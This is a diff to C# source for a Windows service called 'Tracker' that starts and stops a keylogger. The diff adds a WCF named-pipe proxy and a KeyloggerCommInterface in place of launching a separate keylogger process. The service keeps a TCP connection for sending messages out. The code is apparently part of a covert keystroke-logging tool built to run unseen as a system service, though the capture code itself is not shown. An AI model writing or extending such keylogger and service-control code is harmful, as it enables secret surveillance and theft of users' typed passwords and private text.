@@ -11,6 +11,8 @@ using System.Net.Sockets; //used for TcpClient class
 using System.Net; //used for IPEndPoint class
 using System.Threading;
 using System.IO;
+using KeyloggerCommunications;
+using System.ServiceModel;
 
 namespace WindowsServiceTracker
 {
@@ -19,7 +21,7 @@ namespace WindowsServiceTracker
      * We may possibly want to split up our different functions into different
      * classes.
      ***********************************************************************/
-    public partial class Tracker : ServiceBase
+    public partial class Tracker : ServiceBase, KeyloggerCommInterface
     {
         //Constants
         //127.0.0.1 = 0x0100007F because of network byte order
@@ -35,6 +37,9 @@ namespace WindowsServiceTracker
         private IPEndPoint ipPort = new IPEndPoint(IP_ADDRESS, PORT);
         private TcpClient tcp;
         private NetworkStream tcpStream;
+        private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
+            new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeReverse"));
+        private KeyloggerCommInterface pipeProxy;
 
         //private Keylogger keylog = new Keylogger();
 
@@ -62,7 +67,7 @@ namespace WindowsServiceTracker
             //than some Windows folder that I couldn't seem to locate
             System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);
 
-            StartKeyLogger();
+
         }
 
         protected override void OnStop()
@@ -70,9 +75,26 @@ namespace WindowsServiceTracker
             //Keylogger.Stop();
             SendStringMsg("Bye!");
 
-            StopKeyLogger();
+            //StopKeyLogger();
 
             Disconnect();
+        }
+
+        private void CreateOpenPipe()
+        {
+            pipeProxy = pipeFactory.CreateChannel();
+        }
+
+        public bool StartKeylogger()
+        {
+            pipeProxy.StartKeylogger();
+            return true;
+        }
+
+        public bool StopKeylogger()
+        {
+            pipeProxy.StopKeylogger();
+            return true;
         }
 
         private void WriteEventLogEntry(string eventLogInput)
@@ -81,7 +103,7 @@ namespace WindowsServiceTracker
             EventLog.WriteEntry(ERROR_LOG_SOURCE, eventLogInput, EventLogEntryType.Information);
         }
 
-        private bool StartKeyLogger() //todo exception handling
+        /*private bool StartKeyLogger() //todo exception handling
         {
             if (keyLogger != null && keyLogger.Responding)
             {
@@ -101,16 +123,16 @@ namespace WindowsServiceTracker
             //Start the test process, look in TestProcess.cs for the actual process
             keyLogger = Process.Start(keyLoggerStartInfo);
             return true;
-        }
+        }*/
 
-        private bool StopKeyLogger() //todo exception handling
+        /*private bool StopKeyLogger() //todo exception handling
         {
             if (keyLogger != null)
             {
                 keyLogger.Kill(); //todo explore better/safer options
             }
             return true;
-        }
+        }*/
 
         private bool Connect()
         {
